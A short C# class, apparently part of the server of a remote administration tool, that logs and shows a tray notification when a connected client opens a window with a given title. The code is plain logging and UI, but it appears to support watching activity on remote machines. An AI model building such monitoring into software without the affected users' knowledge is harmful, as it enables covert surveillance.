using System.Drawing;
using Server.Connection;
using Server.Properties;

namespace Server.Handle_Packet;

public class HandleReportWindow
{
	public HandleReportWindow(Clients client, string title)
	{
		new HandleLogs().Addmsg("Client " + client.Ip + " Opened [" + title + "]", Color.Blue);
		if (Server.Properties.Settings.Default.Notification)
		{
			Program.form1.notifyIcon1.BalloonTipText = "Client " + client.Ip + " Opened [" + title + "]";
			Program.form1.notifyIcon1.ShowBalloonTip(100);
		}
	}
}
